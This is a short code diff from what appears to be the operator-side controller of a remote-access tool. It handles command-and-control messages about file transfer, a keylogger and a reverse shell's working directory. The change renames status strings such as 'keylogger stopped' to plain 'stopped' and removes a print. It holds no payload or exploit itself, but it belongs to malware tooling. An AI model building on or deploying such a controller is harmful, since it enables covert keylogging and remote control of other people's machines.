@@ -125,9 +125,8 @@ if __name__ == "__main__":
                         command_and_control.receive_file(header)
                     else:
                         msg = command_and_control.receive_message(header)
-                        print(msg)
-                        if msg == "keylogger stopped":
-                            logging.info("keylogger stopped")
+                        if msg == "stopped":
+                            logging.info("stopped")
                             break
                         elif msg == "logging activated":
                             logging.info("logging activated")
@@ -135,7 +134,7 @@ if __name__ == "__main__":
                             logging.info("logging deactivated")
                         elif msg.startswith("current dir"):
                             current_reverse_shell_dir = msg[len("current dir"):]
-                        elif msg == "reverse shell deactivated":
+                        elif msg == "revshell deactivated":
                             current_reverse_shell_dir = ""
                         elif msg == "unknown command":
                             logging.info(f"unknown command: {inpt}")
